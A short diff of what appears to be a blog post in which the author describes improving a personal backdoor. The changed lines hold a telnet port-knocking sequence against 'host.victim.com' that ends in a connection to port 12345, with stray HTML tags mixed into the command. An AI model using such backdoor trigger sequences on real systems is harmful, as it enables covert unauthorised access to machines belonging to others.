@@ -21,8 +21,10 @@ I’ve decided to improve a bit the backdoor for my self usage.  Because I’m a
 
 sh:
 
-# t="telnet host.victim.com"
-# <span style="color:red;">$t 999; $t 888; $t 777 ; $t 666; $t 555;</table> $t <span style="color:green;">12345</span>  ; sleep 1 ; $t <span style="color:blue;">12345</span> 
+\# t="telnet host.victim.com"
+
+
+\# <span style="color:red;">$t 999; $t 888; $t 777 ; $t 666; $t 555;</table> $t <span style="color:green;">12345</span>  ; sleep 1 ; $t <span style="color:blue;">12345</span> 
 
 
 
